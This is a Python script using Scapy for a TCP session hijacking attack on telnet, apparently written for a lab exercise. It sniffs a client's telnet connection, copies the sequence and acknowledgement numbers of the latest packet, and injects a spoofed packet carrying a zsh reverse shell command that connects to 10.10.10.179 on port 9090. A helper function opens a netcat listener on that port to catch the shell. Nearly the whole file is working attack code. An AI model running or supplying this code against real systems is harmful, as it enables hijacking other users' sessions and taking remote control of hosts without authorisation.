from scapy.all import *
from multiprocessing import Process

tcp_sniff_proc = Process()
ip_client = ""
filter_tcp = "tcp and host " + ip_client
tcp_pkt_lst = []
last_tcp_pkt = TCP()

def hijack(sport, seq, ack, cmd, ip_dst):
	global ip_client
	ip = IP(src = ip_client, dst = ip_dst)
	tcp = TCP(sport = sport, dport = 23, flags = "A", seq = seq, ack = ack)
	data = "\n" + cmd + "\n"
	pkt = ip/tcp/data
	ls(pkt)
	send(pkt, verbose = 0)
	print("Pkt sent!")

def last_tcp(pkt):
	global tcp_pkt_lst
	if (pkt[IP].src == ip_client and pkt.haslayer(TCP) and pkt[TCP].flags == "A" and pkt[TCP].dport == 23):
		tcp_pkt_lst.append(pkt)
		print(pkt.summary())
	

def test_sniff(pkt):
	global tcp_pkt_lst, last_tcp_pkt, ip_client

	if (pkt[IP].src == ip_client and pkt.haslayer(TCP) and pkt[TCP].flags == "S" and pkt[TCP].dport == 23):
		filter_tcp_a = "tcp and host " + ip_client
		sniff(filter = filter_tcp_a, timeout = 10, prn = last_tcp) #timeout should be 60
		print("Sniff complete")
		last_tcp_pkt = tcp_pkt_lst[-1][TCP]
		last_ip_pkt = tcp_pkt_lst[-1][IP]
		print(last_tcp_pkt.show())
		hijack(sport = last_tcp_pkt[TCP].sport, seq = last_tcp_pkt[TCP].seq, ack = last_tcp_pkt[TCP].ack, 
		cmd = "zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.179 9090 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'", ip_dst = last_ip_pkt[IP].dst)
		

def tcp_sniff(client, dummy):
	global ip_client
	ip_client = client
	ip_src = " and host " + ip_client
	filt_telnet = "tcp" + ip_src
	sniff(filter = filt_telnet, prn = test_sniff)

def terminal_nc():
	print(os.getpid())
	os.system("x-terminal-emulator -e 'nc -nlvp 9090'")
